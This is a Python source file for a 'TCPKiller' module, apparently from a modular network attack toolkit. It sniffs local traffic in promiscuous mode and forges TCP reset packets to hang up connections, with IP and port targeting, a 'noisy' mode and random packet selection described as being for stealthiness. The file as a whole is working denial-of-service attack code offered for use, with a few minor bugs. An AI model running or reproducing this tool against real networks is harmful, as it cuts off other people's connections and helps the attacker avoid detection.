#!/usr/bin/env python

import binascii
import socket
import struct
import argparse
import sys
import logging
import os
import traceback
import socket

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import Ether, IP, IPv6, TCP, sendp, conf, sniff
from random import randint
from capability import *
from colorama import *
from interface import *

def args_error():
    print BAD + "Invalid parameters."


def validate_ips(ips):
    clean = []
    if ips is None or not isinstance(ips, list):
        return []
    for ip in ips:
        if "," in ip:
            ips += filter(None, ip.split(","))
        else:
            try:
                socket.inet_aton(ip)
            except Exception as e:
                print e
                print("error: invalid ip address \"%s\", exiting." % ip)
                return None
        clean.append(ip)
    return clean


def is_int(s):
    try: 
        int(s)
        return True
    except ValueError:
        return False


def validate_ports(ports):
    clean = []
    if ports is not None:
        for port in ports:
            if "," in port:
                ports += port.split(",")
            elif "-" in port:
                low, high = port.split("-")
                if not is_int(low) or not is_int(high):
                    print("error: invalid port range \"%s\", exiting." % port)
                    return None
            elif not is_int(port):
                return None
            clean.append(port)
        return clean
    return []


def validate_args(args):
    for arg in ["allow", "allow_source", "allow_destination", "target", "target_source", "target_destination"]:
        if arg in args and args[arg] is not None and not validate_ips(args[arg]):
            args_error()
    for arg in ["allow_port", "allow_source_port", "allow_destination_port", "target_port", "target_source_port", "target_destination_port"]: 
        if arg in args and args[arg] is not None and not validate_ports(args[arg]):
            args_error()


class TCPKiller(Capability):

    def __init__(self, core):
        super(TCPKiller, self).__init__(core)
        self.name = "TCPKiller"
        self.core = core
        self.options = {
            "interface":                Option("interface", "eth0", "interface to act upon", True),
            "allow":                    Option("allow", self.core.localIP, "do not attack this ip address's connections, whether it's the source or destination of a packet", False),
            "allow_source":             Option("allow-source", False, "do not attack this ip address's connections, but only if it's the source of a packet", False),
            "allow_destination":        Option("destination-source", False, "do not attack this ip address's connections, but only if it's the destination of a packet", False),
            "target":                   Option("target", "0.0.0.0", "actively target given ip address, whether it is the source or destination of a packet", False),
            "target_source":            Option("target-source", "0.0.0.0", "actively target this ip address, but only if it's the source of a packet", False),
            "target_destination":       Option("target-destination", "0.0.0.0", "actively target this ip address, but only if it's the destination of a packet", False),
            "allow_port":               Option("allow-port", None, "do not attack any connections involving this port, whether it's the source or destination of a packet", False),
            "allow_source_port":        Option("allow-source-port", None, "do not attack any connections involving this port, but only if it's the source of a packet", False),
            "allow_destination_port":   Option("allow-source-port", None, "do not attack any connections involving this port, but only if it's the destination of a packet", False),
            "target_port":              Option("target-port", None, "actively target any connections involving these ports whether it is the source or destination of a packet", False),
            "target_source_port":       Option("target-source-port", None, "actively target any connections involving this port, but only if it's the source", False),
            "target_destination_port":  Option("target-source-port", None, "actively target any connections involving this port, but only if it's the destination", False),
            "noisy":                    Option("noisy", False, "sends many more packets to attempt connection resets to increase effectiveness", False),
            "randomize":                Option("randomize", "all", "target only SOME of the matching packets for increased stealthiness", False),
            "verbose":                  Option("verbose", "True", "verbose output", False)
        }
        self.help_text = INFO + "Forges TCP reset packets to hangup all ipv4 tcp connections"

    def setup(self):
        args = {}
        for opt in self.options:
            args[opt] = self.get_value(opt)
        self.iface = args["interface"]
        self.verbose = args["verbose"]
        self.noisy = args["noisy"]
        self.randomize = args["randomize"]

        self.VERBOSE = False
        self.allow = self.allow_source = self.allow_destination = []
        self.target = self.target_source = self.target_destination = []
        self.aports = self.allow_sport = self.allow_dport = []
        self.tports = self.target_sport = self.target_dport = []
        self.ranges = {}

        self.allow = validate_ips(args["allow"])
        self.allow_src = validate_ips(args["allow_source"])
        self.allow_dst = validate_ips(args["allow_destination"])
        self.target = validate_ips(args["target"])
        self.target_src = validate_ips(args["target_source"])
        self.target_dst = validate_ips(args["target_destination"])

        self.allow_ports = validate_ports(args["allow_port"])
        self.allow_sport = validate_ports(args["allow_source_port"])
        self.allow_dport = validate_ports(args["allow_destination_port"])
        self.target_ports = validate_ports(args["target_port"])
        self.target_sport = validate_ports(args["target_source_port"])
        self.target_dport = validate_ports(args["target_destination_port"])
        self.args = args
        self.stop_sniffing = False
        try:
            self.s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
        except:
            print BAD + "Raw sockets are unavailable on this platform. Exiting."
            return None
        print("[*] Initialized tcpkiller on %s in %s mode, targeting %s%s. Press Ctrl-C to exit." %(self.iface, ("noisy" if self.noisy else "quiet"), (args["randomize"]), (" with verbosity enabled" if self.verbose else "")))
        if self.allow:
            print("[*] Allowing all connections involving " + ", ".join(self.allow))
        if self.allow_src:
            print("[*] Allowing all connections originating from " + ", ".join(self.allow_src))
        if self.allow_dst:
            print("[*] Allowing all connections coming from " + ", ".join(self.allow_dst))

        if self.target:
            print("[*] Targeting all connections involving " + ", ".join(self.target))
        if self.target_src:
            print("[*] Targeting all connections originating from " + ", ".join(self.target_src))
        if self.target_dst:
            print("[*] Targeting all connections coming from " + ", ".join(self.target_dst))

        if self.allow_ports:
            print("[*] Allowing all connections involving " + ", ".join(self.allow_ports))
        if self.allow_sport:
            print("[*] Allowing all connections originating from " + ", ".join(self.allow_sport))
        if self.allow_dport:
            print("[*] Allowing all connections coming from " + ", ".join(self.allow_dport))

        if self.target_ports:
            print("[*] Targeting all connections involving " + ", ".join(self.target_ports))
        if self.target_sport:
            print("[*] Targeting all connections originating from " + ", ".join(self.target_sport))
        if self.target_dport:
            print("[*] Targeting all connections coming from " + ", ".join(self.target_dport))
        return True

    ###############################################################
    # Packet Handling                                             #
    ###############################################################

    # Given command line arguements, method determines if this packet should be responded to
    def ignore_packet(self, packet, proto):
        src_ip = packet[proto].src
        dst_ip = packet[proto].dst
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport

        # Target or allow by IP
        if (src_ip in self.allow or dst_ip in self.allow) or (src_ip in self.allow_src) or (dst_ip in self.allow_dst):
            return True
        elif (self.target and ( self.src_ip not in self.target and self.dst_ip not in self.target)) or (self.target_src and not src_ip in self.target_src) or (self.target_dst and not dst_ip in self.target_dst):
            return True

        # Target or allow by Port
        if (src_port in self.allow_ports or dst_port in self.allow_ports) or (src_port in self.allow_sport) or (dst_port in self.allow_dport):
            return True
        elif (self.target_ports and (not src_port in self.target_ports and not dst_port in self.target_ports)) or (self.target_sport and not src_port in self.target_sport) or (self.target_dport and not dst_port in self.target_dport):
            return True

        # Target randomly
        if self.randomize == "often" and randint(1, 10) < 2:
            return True
        elif self.randomize == "half" and randint(1, 10) < 5:
            return True
        elif self.randomize == "seldom" and randint(1, 10) < 8:
            return True
        else:
            return False


    ###############################################################
    # Scapy                                                       #
    ###############################################################

    def send(self, packet):
        self.s.send(packet)

    def build_packet(self, src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, proto):
        eth = Ether(src=src_mac, dst=dst_mac, type=0x800)
        if proto == IP:
            ip = IP(src=src_ip, dst=dst_ip)
        elif proto == IPv6:
            ip = IPv6(src=src_ip, dst=dst_ip)
        else:
            return str(eth) #if unknown L2 protocol, send back dud ether packet
        tcp = TCP(sport=src_port, dport=dst_port, seq=seq, flags="R")
        return str(eth/ip/tcp)

    def callback(self, packet):
        flags = packet.sprintf("%TCP.flags%")
        proto = IP
        if IPv6 in packet:
            proto = IPv6
        if flags == "A" and not self.ignore_packet(packet, proto):
            src_mac = packet[Ether].src
            dst_mac = packet[Ether].dst
            src_ip = packet[proto].src
            dst_ip = packet[proto].dst
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            seq = packet[TCP].seq
            ack = packet[TCP].ack
            if self.verbose:
                print("RST from %s:%s (%s) --> %s:%s (%s) w/ %s" % (src_ip, src_port, src_mac, dst_ip, dst_port, dst_mac, ack))
            if self.noisy:
                self.send(self.build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, proto))
            self.send(self.build_packet(dst_mac, src_mac, dst_ip, src_ip, dst_port, src_port, ack, proto))

    def stop_cond(self, _):
        return self.stop_sniffing

    def launch(self):
        success = self.setup()
        if not success:
            return
        self.s.bind((self.iface, 0))

        conf.sniff_promisc = True
        sniff(filter='tcp', prn=self.callback, store=0, stop_filter=self.stop_cond)

